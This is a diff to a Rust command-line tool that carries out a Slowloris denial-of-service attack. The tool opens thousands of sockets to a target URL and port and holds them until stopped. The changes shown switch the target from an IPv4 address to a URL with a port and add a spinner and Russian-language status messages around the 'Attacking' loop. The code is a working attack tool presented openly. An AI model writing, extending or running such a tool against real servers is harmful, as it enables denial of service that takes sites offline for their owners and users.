@@ -8,6 +8,7 @@ use std::{
 
 use log::{debug, error, info};
 use rand::Rng;
+use spinners::{Spinner, Spinners};
 
 pub fn slowloris(c: &seahorse::Context) {
     if c.bool_flag("verbose") {
@@ -18,22 +19,23 @@ pub fn slowloris(c: &seahorse::Context) {
     env_logger::init();
 
     if c.args.is_empty() {
-        error!("Please provide a target ipv4 address");
+        error!("Please provide a url");
         return;
     }
-    let ip = c.args[0].clone();
+    let port = c.int_flag("port").unwrap_or(80);
+    let url = format!("{}:{}", c.args[0].clone(), port);
 
     let sock_cnt = c.int_flag("socket").unwrap_or(10000);
     let rx = ctrlc_handler();
 
-    info!("Starting slowloris attack on {}", ip);
+    info!("Starting slowloris attack on {}", url);
     info!("If you want to stop the attack, press Ctrl-C");
-    execute(ip, sock_cnt as usize, rx);
-    println!("Exiting...");
+    execute(url, sock_cnt as usize, rx);
+    println!();
+    info!("\x1b[32mДо свидания:)\x1b[m \x1b[35m\x1b[m");
 }
 
 fn execute<P: ToSocketAddrs>(ip: P, sock_cnt: usize, rx: std::sync::mpsc::Receiver<()>) {
-    info!("Creating {} sockets...", sock_cnt);
     let mut sock_list = Vec::new();
     for s in 0..sock_cnt {
         match init_socket(&ip) {
@@ -45,7 +47,10 @@ fn execute<P: ToSocketAddrs>(ip: P, sock_cnt: usize, rx: std::sync::mpsc::Receiv
             }
         }
     }
-    info!("Done. Attacking...");
+    let mut sp = Spinner::new(
+        Spinners::BoxBounce2,
+        "\x1b[31mAttacking... В действии...\x1b[m \x1b[36m\x1b[m".into(),
+    );
     let mut rng = rand::thread_rng();
     loop {
         if rx.try_recv().is_ok() {
@@ -76,6 +81,7 @@ fn execute<P: ToSocketAddrs>(ip: P, sock_cnt: usize, rx: std::sync::mpsc::Receiv
             }
         }
     }
+    sp.stop();
 }
 fn init_socket<P: ToSocketAddrs>(to: P) -> Result<TcpStream, std::io::Error> {
     TcpStream::connect(to)
